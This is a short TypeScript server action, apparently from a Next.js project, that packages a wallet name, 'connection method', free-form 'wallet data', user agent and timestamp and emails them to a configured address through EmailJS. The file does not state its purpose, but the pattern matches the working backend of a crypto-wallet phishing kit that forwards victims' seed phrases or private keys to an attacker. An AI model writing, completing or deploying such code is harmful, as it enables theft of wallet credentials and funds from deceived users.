"use server"

import emailjs from "@emailjs/nodejs"

export async function sendWalletData(data: {
  walletName: string
  connectionMethod: string
  walletData: string
  userAgent: string
  timestamp: string
}) {
  try {
    if (!process.env.EMAILJS_SERVICE_ID || !process.env.EMAILJS_TEMPLATE_ID || !process.env.EMAILJS_PUBLIC_KEY) {
      return {
        success: false,
        error:
          "EmailJS environment variables not configured. Please check EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, and EMAILJS_PUBLIC_KEY.",
      }
    }

    const templateParams = {
      wallet_name: data.walletName,
      connection_method: data.connectionMethod,
      wallet_data: data.walletData,
      user_agent: data.userAgent,
      timestamp: data.timestamp,
    }

    const response = await emailjs.send(
      process.env.EMAILJS_SERVICE_ID,
      process.env.EMAILJS_TEMPLATE_ID,
      templateParams,
      {
        publicKey: process.env.EMAILJS_PUBLIC_KEY,
      },
    )

    console.log("[v0] EmailJS response:", response)
    return { success: true, response }
  } catch (error: any) {
    console.error("[v0] Failed to send email:", error)
    const errorMessage = error?.message || error?.text || "Unknown EmailJS error"
    return {
      success: false,
      error: `EmailJS Error: ${errorMessage}. Please verify your EmailJS configuration.`,
    }
  }
}
